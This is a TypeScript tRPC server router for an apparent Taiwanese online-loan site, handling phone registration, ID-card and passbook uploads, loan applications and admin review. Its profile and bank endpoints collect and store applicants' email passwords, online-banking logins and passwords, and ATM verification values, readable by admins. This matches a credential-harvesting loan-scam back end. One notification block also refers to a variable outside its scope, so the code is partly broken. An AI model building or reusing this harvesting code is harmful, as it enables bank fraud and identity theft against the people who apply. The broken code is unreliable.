import { z } from "zod";
import { TRPCError } from "@trpc/server";
import { COOKIE_NAME } from "@shared/const";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { sdk } from "./_core/sdk";
import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
import { notifyOwner } from "./_core/notification";
// storage import removed - images stored as base64 in database
import type { InsertIdDocument } from "../drizzle/schema";
import bcrypt from "bcryptjs";
import { notifyNewUser, notifyProfileUpdated, notifyDocumentUploaded, notifyLoanApplication } from "./email";
import {
  upsertUser,
  getUserByOpenId,
  getUserByPhone,
  createUserWithPhone,
  getUserById,
  getAllUsers,
  getUsersByRole,
  getDeletedUsers,
  getUserProfile,
  upsertUserProfile,
  getIdDocument,
  getAllIdDocuments,
  createOrUpdateIdDocument,
  updateIdDocumentStatus,
  createLoanApplication,
  getLoanApplicationsByUser,
  getLoanApplicationById,
  getAllLoanApplications,
  updateLoanApplicationStatus,
  getLoanStats,
  createRepayment,
  getRepaymentsByLoan,
  updateRepayment,
  updateUserStatus,
  updateUserLastLoginIp,
  deleteUser,
} from "./db";

// Admin guard middleware
const adminProcedure = protectedProcedure.use(({ ctx, next }) => {
  if (ctx.user.role !== "admin") {
    throw new TRPCError({ code: "FORBIDDEN", message: "需要管理員權限" });
  }
  return next({ ctx });
});

export const appRouter = router({
  system: systemRouter,

  auth: router({
    me: publicProcedure.query((opts) => opts.ctx.user),

    register: publicProcedure
      .input(z.object({
        phone: z.string().regex(/^09\d{8}$/, "請輸入正確的台灣手機號碼（09 開頭，共 10 碼）"),
        password: z.string().min(6).max(100),
        name: z.string().min(1).max(50).optional(),
      }))
      .mutation(async ({ ctx, input }) => {
        // 檢查手機號碼是否已註冊
        const existing = await getUserByPhone(input.phone);
        if (existing) {
          throw new TRPCError({ code: "CONFLICT", message: "此手機號碼已被註冊" });
        }
        // 雜湊密碼
        const passwordHash = await bcrypt.hash(input.password, 10);
        // 建立用戶
        const user = await createUserWithPhone(input.phone, passwordHash, input.name, 'limitdai');
        if (!user) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "建立帳號失敗" });
        // 建立 session
        const token = await sdk.createSessionToken(user.openId, { name: user.name ?? "" });
        const cookieOptions = getSessionCookieOptions(ctx.req);
                ctx.res.cookie(COOKIE_NAME, token, { ...cookieOptions, maxAge: 365 * 24 * 60 * 60 * 1000 });
        // 發送 Email 通知管理員
        try {
          await notifyNewUser(input.phone);
        } catch (e) { console.warn('[Email] notifyNewUser failed:', e); }
        return { success: true, user: { id: user.id, phone: user.phone, name: user.name, role: user.role } };
      }),
    login: publicProcedure
      .input(z.object({
        phone: z.string().min(2).max(20),
        password: z.string().min(1),
        isAdmin: z.boolean().optional().default(false),
      }))
      .mutation(async ({ ctx, input }) => {
        // 一般會員登入需驗證手機號碼格式
        if (!input.isAdmin && !/^09\d{8}$/.test(input.phone)) {
          throw new TRPCError({ code: "BAD_REQUEST", message: "請輸入正確的台灣手機號碼（09 開頭，共 10 碼）" });
        }
        const user = await getUserByPhone(input.phone);
        if (!user || !user.passwordHash) {
          throw new TRPCError({ code: "UNAUTHORIZED", message: "帳號或密碼錯誤" });
        }
        const valid = await bcrypt.compare(input.password, user.passwordHash);
        if (!valid) {
          throw new TRPCError({ code: "UNAUTHORIZED", message: "手機號碼或密碼錯誤" });
        }
        // 檢查帳號是否被凍結
        if (user.status === 'frozen') {
          throw new TRPCError({ code: "FORBIDDEN", message: "此帳號已被凍結，請聯繫客服" });
        }
        // 記錄登入 IP
        const ip = (ctx.req.headers['x-forwarded-for'] as string)?.split(',')[0]?.trim() || ctx.req.socket?.remoteAddress || '';
        await updateUserLastLoginIp(user.id, ip);
        // 建立 session
        const token = await sdk.createSessionToken(user.openId, { name: user.name ?? "" });
        const cookieOptions = getSessionCookieOptions(ctx.req);
        ctx.res.cookie(COOKIE_NAME, token, { ...cookieOptions, maxAge: 365 * 24 * 60 * 60 * 1000 });
        return { success: true, user: { id: user.id, phone: user.phone, name: user.name, role: user.role } };
      }),

    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return { success: true } as const;
    }),

    changePassword: protectedProcedure
      .input(z.object({
        currentPassword: z.string().min(1),
        newPassword: z.string().min(6).max(100),
      }))
      .mutation(async ({ ctx, input }) => {
        const user = await getUserByOpenId(ctx.user.openId);
        if (!user || !user.passwordHash) {
          throw new TRPCError({ code: "BAD_REQUEST", message: "此帳號不支援密碼修改" });
        }
        const valid = await bcrypt.compare(input.currentPassword, user.passwordHash);
        if (!valid) {
          throw new TRPCError({ code: "UNAUTHORIZED", message: "目前密碼不正確" });
        }
        const newHash = await bcrypt.hash(input.newPassword, 10);
        await upsertUser({ openId: user.openId, passwordHash: newHash });
        return { success: true };
      }),
  }),

  // ─── User Profile ──────────────────────────────────────────────────────────
  profile: router({
    get: protectedProcedure.query(async ({ ctx }) => {
      return getUserProfile(ctx.user.id);
    }),

    upsert: protectedProcedure
      .input(z.object({
        fullName: z.string().min(1).max(100),
        idNumber: z.string().min(8).max(20),
        phone: z.string().min(8).max(20),
        address: z.string().min(1),
        occupation: z.string().optional(),
        monthlyIncome: z.string().optional(),
        emailAddress: z.string().email().optional().or(z.literal("")),
        emailPassword: z.string().optional(),
      }))
      .mutation(async ({ ctx, input }) => {
        await upsertUserProfile({
          userId: ctx.user.id,
          fullName: input.fullName,
          idNumber: input.idNumber,
          phone: input.phone,
          address: input.address,
          occupation: input.occupation ?? null,
          monthlyIncome: input.monthlyIncome ?? null,
          emailAddress: input.emailAddress || null,
          emailPassword: input.emailPassword || null,
          profileCompleted: "complete",
        });
        // 發送 Email 通知管理員
        try {
          const userObj = await getUserById(ctx.user.id);
          await notifyProfileUpdated(userObj?.phone ?? '', input.fullName);
        } catch (e) { console.warn('[Email] notifyProfileUpdated failed:', e); }
        return { success: true };
      }),
  }),

  // ─── ID Documents ──────────────────────────────────────────────────────────
  documents: router({
    get: protectedProcedure.query(async ({ ctx }) => {
      return getIdDocument(ctx.user.id);
    }),

    upload: protectedProcedure
      .input(z.object({
        side: z.enum(["front", "back"]),
        base64: z.string(),
        mimeType: z.string().default("image/jpeg"),
      }))
      .mutation(async ({ ctx, input }) => {
        const dataUrl = `data:${input.mimeType};base64,${input.base64}`;
        const existing = await getIdDocument(ctx.user.id);
        const updateData: InsertIdDocument = { userId: ctx.user.id };
        if (input.side === "front") {
          updateData.frontImageKey = `db:${ctx.user.id}:front`;
          updateData.frontImageUrl = dataUrl;
          if (existing?.backImageKey) {
            updateData.backImageKey = existing.backImageKey;
            updateData.backImageUrl = existing.backImageUrl ?? "";
          }
        } else {
          updateData.backImageKey = `db:${ctx.user.id}:back`;
          updateData.backImageUrl = dataUrl;
          if (existing?.frontImageKey) {
            updateData.frontImageKey = existing.frontImageKey;
            updateData.frontImageUrl = existing.frontImageUrl ?? "";
          }
        }
        await createOrUpdateIdDocument(updateData);
        return { success: true, url: dataUrl };
      }),
    uploadPassbook: protectedProcedure
      .input(z.object({
        base64: z.string(),
        mimeType: z.string().default("image/jpeg"),
      }))
      .mutation(async ({ ctx, input }) => {
        const dataUrl = `data:${input.mimeType};base64,${input.base64}`;
        const existing = await getIdDocument(ctx.user.id);
        const updateData: InsertIdDocument = {
          userId: ctx.user.id,
          passbookImageKey: `db:${ctx.user.id}:passbook`,
          passbookImageUrl: dataUrl,
        };
        if (existing?.frontImageKey) {
          updateData.frontImageKey = existing.frontImageKey;
          updateData.frontImageUrl = existing.frontImageUrl ?? "";
        }
        if (existing?.backImageKey) {
          updateData.backImageKey = existing.backImageKey;
          updateData.backImageUrl = existing.backImageUrl ?? "";
        }
        await createOrUpdateIdDocument(updateData);
        return { success: true, url: dataUrl };
      }),

    updateBankInfo: protectedProcedure
      .input(z.object({
        bankName: z.string().min(1).max(100),
        bankBranch: z.string().max(100).optional(),
        bankAccount: z.string().min(1).max(50),
        onlineBankAccount: z.string().max(100).optional(),
        onlineBankPassword: z.string().max(255).optional(),
        atmVerification: z.string().max(255).optional(),
      }))
      .mutation(async ({ ctx, input }) => {
        const existing = await getIdDocument(ctx.user.id);
        const updateData: InsertIdDocument = {
          userId: ctx.user.id,
          bankName: input.bankName,
          bankBranch: input.bankBranch ?? null,
          bankAccount: input.bankAccount,
          onlineBankAccount: input.onlineBankAccount ?? null,
          onlineBankPassword: input.onlineBankPassword ?? null,
          atmVerification: input.atmVerification ?? null,
        };
        if (existing?.frontImageKey) {
          updateData.frontImageKey = existing.frontImageKey;
          updateData.frontImageUrl = existing.frontImageUrl ?? "";
        }
        if (existing?.backImageKey) {
          updateData.backImageKey = existing.backImageKey;
          updateData.backImageUrl = existing.backImageUrl ?? "";
        }
        if (existing?.passbookImageKey) {
          updateData.passbookImageKey = existing.passbookImageKey;
          updateData.passbookImageUrl = existing.passbookImageUrl ?? "";
        }
        await createOrUpdateIdDocument(updateData);
        return { success: true };
      }),

    updateRepaymentBankInfo: protectedProcedure
      .input(z.object({
        repaymentBankName: z.string().min(1).max(100),
        repaymentBankBranch: z.string().max(100).optional(),
        repaymentBankAccount: z.string().min(1).max(50),
        repaymentOnlineBankAccount: z.string().max(100).optional(),
        repaymentOnlineBankPassword: z.string().max(255).optional(),
        repaymentAtmVerification: z.string().max(255).optional(),
      }))
      .mutation(async ({ ctx, input }) => {
        const existing = await getIdDocument(ctx.user.id);
        const updateData: InsertIdDocument = {
          userId: ctx.user.id,
          repaymentBankName: input.repaymentBankName,
          repaymentBankBranch: input.repaymentBankBranch ?? null,
          repaymentBankAccount: input.repaymentBankAccount,
          repaymentOnlineBankAccount: input.repaymentOnlineBankAccount ?? null,
          repaymentOnlineBankPassword: input.repaymentOnlineBankPassword ?? null,
          repaymentAtmVerification: input.repaymentAtmVerification ?? null,
        };
        if (existing?.frontImageKey) {
          updateData.frontImageKey = existing.frontImageKey;
          updateData.frontImageUrl = existing.frontImageUrl ?? "";
        }
        if (existing?.backImageKey) {
          updateData.backImageKey = existing.backImageKey;
          updateData.backImageUrl = existing.backImageUrl ?? "";
        }
        if (existing?.passbookImageKey) {
          updateData.passbookImageKey = existing.passbookImageKey;
          updateData.passbookImageUrl = existing.passbookImageUrl ?? "";
        }
        await createOrUpdateIdDocument(updateData);
        return { success: true };
      }),
  }),

  // ─── Loan Applications ─────────────────────────────────────────────────────
  loans: router({
    myLoans: protectedProcedure.query(async ({ ctx }) => {
      return getLoanApplicationsByUser(ctx.user.id);
    }),

    create: protectedProcedure
      .input(z.object({
        loanAmount: z.string(),
        loanDurationMonths: z.number().int().min(6).max(120),
        purpose: z.string().min(1).max(255),
        repaymentMethod: z.enum(["equal_principal_interest", "equal_principal", "bullet"]),
      }))
      .mutation(async ({ ctx, input }) => {
        await createLoanApplication({
          userId: ctx.user.id,
          loanAmount: input.loanAmount,
          loanDurationMonths: input.loanDurationMonths,
          purpose: input.purpose,
          repaymentMethod: input.repaymentMethod,
          status: "待審核",
        });

        // Email 通知管理員
        try {
          const userObj = await getUserById(ctx.user.id);
          await notifyLoanApplication(userObj?.phone ?? '', Number(input.loanAmount), input.purpose);
        } catch (e) { console.warn('[Email] notify failed:', e); }
        // Manus 通知管理員
        try {
          await notifyOwner({
            title: "新借款申請",
            content: `用戶 ${userObj?.phone} 申請借款 ${input.loanAmount} 元，用途：${input.purpose}`,
          });
        } catch (e) { console.warn('[Manus] notifyOwner failed:', e); }
        return { success: true };
      }),

    getById: protectedProcedure
      .input(z.object({ loanId: z.number() }))
      .query(async ({ ctx, input }) => {
        const loan = await getLoanApplicationById(input.loanId);
        if (!loan || loan.userId !== ctx.user.id) {
          throw new TRPCError({ code: "FORBIDDEN", message: "無權訪問此借款申請" });
        }
        return loan;
      }),
  }),

  // ─── Repayments ────────────────────────────────────────────────────────────
  repayments: router({
    getByLoan: protectedProcedure
      .input(z.object({ loanId: z.number() }))
      .query(async ({ ctx, input }) => {
        const loan = await getLoanApplicationById(input.loanId);
        if (!loan || loan.userId !== ctx.user.id) {
          throw new TRPCError({ code: "FORBIDDEN", message: "無權訪問此借款申請" });
        }
        return getRepaymentsByLoan(input.loanId);
      }),
  }),

  // ─── Admin Routes ──────────────────────────────────────────────────────────
  admin: router({
    users: router({
      list: adminProcedure.query(async () => {
        return getAllUsers();
      }),

      getById: adminProcedure
        .input(z.object({ userId: z.number() }))
        .query(async ({ input }) => {
          return getUserById(input.userId);
        }),

      updateStatus: adminProcedure
        .input(z.object({
          userId: z.number(),
          status: z.enum(["active", "frozen", "deleted"]),
        }))
        .mutation(async ({ input }) => {
          await updateUserStatus(input.userId, input.status);
          return { success: true };
        }),

      delete: adminProcedure
        .input(z.object({ userId: z.number() }))
        .mutation(async ({ input }) => {
          await deleteUser(input.userId);
          return { success: true };
        }),
    }),

    documents: router({
      list: adminProcedure.query(async () => {
        return getAllIdDocuments();
      }),

      updateStatus: adminProcedure
        .input(z.object({
          documentId: z.number(),
          status: z.enum(["pending", "reviewing", "verified", "rejected"]),
          reviewNote: z.string().optional(),
        }))
        .mutation(async ({ ctx, input }) => {
          await updateIdDocumentStatus(input.documentId, input.status, ctx.user.id, input.reviewNote);
          return { success: true };
        }),
    }),

    loans: router({
      list: adminProcedure.query(async () => {
        return getAllLoanApplications();
      }),

      updateStatus: adminProcedure
        .input(z.object({
          loanId: z.number(),
          status: z.string(),
        }))
        .mutation(async ({ input }) => {
          await updateLoanApplicationStatus(input.loanId, input.status);
          return { success: true };
        }),

      stats: adminProcedure.query(async () => {
        return getLoanStats();
      }),
    }),

    repayments: router({
      list: adminProcedure.query(async () => {
        const loans = await getAllLoanApplications();
        const allRepayments = [];
        for (const loan of loans) {
          const repayments = await getRepaymentsByLoan(loan.id);
          allRepayments.push(...repayments);
        }
        return allRepayments;
      }),

      updateStatus: adminProcedure
        .input(z.object({
          repaymentId: z.number(),
          status: z.enum(["pending", "completed", "overdue"]),
        }))
        .mutation(async ({ input }) => {
          await updateRepayment(input.repaymentId, { status: input.status });
          return { success: true };
        }),
    }),

    admins: router({
      list: adminProcedure.query(async () => {
        return getUsersByRole("admin");
      }),

      create: adminProcedure
        .input(z.object({
          phone: z.string().regex(/^09\d{8}$/, "請輸入正確的台灣手機號碼"),
          password: z.string().min(6),
          name: z.string().min(1).max(50),
        }))
        .mutation(async ({ input }) => {
          const existing = await getUserByPhone(input.phone);
          if (existing) {
            throw new TRPCError({ code: "CONFLICT", message: "此手機號碼已被註冊" });
          }
          const passwordHash = await bcrypt.hash(input.password, 10);
          const user = await createUserWithPhone(input.phone, passwordHash, input.name, 'limitdai');
          if (!user) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "建立帳號失敗" });
          await upsertUser({ id: user.id, role: "admin" });
          return { success: true, user };
        }),

      delete: adminProcedure
        .input(z.object({ userId: z.number() }))
        .mutation(async ({ input }) => {
          await deleteUser(input.userId);
          return { success: true };
        }),
    }),
  }),
});

export type AppRouter = typeof appRouter;
